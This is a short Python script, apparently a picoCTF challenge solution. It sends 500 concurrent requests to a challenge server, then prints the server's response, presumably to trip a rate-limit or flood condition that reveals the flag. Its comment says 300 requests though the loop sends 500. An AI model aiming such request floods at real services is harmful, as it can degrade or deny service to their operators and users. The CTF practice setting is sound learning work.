import asyncio

import aiohttp
import requests

URL = "http://mysterious-sea.picoctf.net:54090/"

async def get_dummy(i: int, session: aiohttp.ClientSession):
    async with session.get(URL) as response:
        print(f"Request #{i} sent, status: {response.status}")


async def main():
    async with aiohttp.ClientSession() as session:
        # Parallel 300 requests to URL
        print("Sending 300 requests to the server...")
        tasks = []
        for i in range(500):
            tasks.append(get_dummy(i, session))
        await asyncio.gather(*tasks)

        # Request and print the response
        async with session.get(URL) as response:
            print(await response.text())

if __name__ == "__main__":
    asyncio.run(main())